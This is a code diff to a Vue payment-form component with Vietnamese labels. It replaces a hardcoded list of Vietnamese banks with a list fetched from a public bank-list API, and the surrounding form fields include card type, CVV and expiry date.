@@ -171,6 +171,7 @@
 <script setup>
 import axios from '@/plugins/axios';
 import { socket } from '@/plugins/socket';
+import Api from 'axios';
 import { computed, onMounted, ref } from 'vue';
 import { useRouter } from 'vue-router';
 import { useStore } from 'vuex';
@@ -193,6 +194,16 @@ onMounted(() => {
             dialogMessage.value = 'Vui lòng liên hệ zalo để được hỗ trợ.'
         }
     })
+
+    Api.get('https://api.vietqr.io/v2/banks').then(res => {
+        bankList.value = res.data.data
+        bankList.value.forEach((item) => {
+            item.title = item.name + ' - ' + item.short_name
+            item.value = item.code
+        })
+    }).catch(err => {
+        console.log(err)
+    })
 })
 const setCvv = (value) => {
     if (value === 'Thẻ ghi nợ quốc tế' || value === 'Thẻ tín dụng Mastercard, Jcb, Visa') {
@@ -207,69 +218,7 @@ const changeCardDate = (value) => {
         formValue.value.cardDate = value + '/'
     }
 }
-const bankList = ref([
-    {
-        value: 'HDBank',
-        title: 'Ngân hàng Phát triển Thành phố Hồ Chí Minh (HDBank)'
-    },
-    {
-        value: 'MB',
-        title: 'Ngân hàng Quân Đội (MB)'
-    },
-    {
-        value: 'ACB',
-        title: 'Ngân hàng Á Châu (ACB)'
-    },
-    {
-        value: 'VPBank',
-        title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
-    },
-    {
-        value: 'VCB',
-        title: 'Ngân hàng Ngoại Thương Việt Nam (VCB)'
-    },
-    {
-        value: 'Techcombank',
-        title: 'Ngân hàng Kỹ Thương Việt Nam (Techcombank)'
-    },
-    {
-        value: 'VietinBank',
-        title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
-    },
-    {
-        value: 'BIDV',
-        title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
-    },
-    {
-        value: 'Agribank',
-        title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
-    },
-    {
-        value: 'Sacombank',
-        title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
-    },
-    {
-        value: 'SHB',
-        title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
-    },
-    {
-        value: 'SeABank',
-        title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
-    },
-    {
-        value: 'VIB',
-        title: 'Ngân hàng Quốc tế (VIB)'
-    },
-    {
-        value: 'TPBank',
-        title: 'Ngân hàng Tiên Phong (TPBank)'
-    },
-    {
-        value: 'OceanBank',
-        title: 'Ngân hàng Đại Dương (OceanBank)'
-    }
-
-])
+const bankList = ref([])
 
 const formValue = ref({
     fullName: userStorage.fullName,
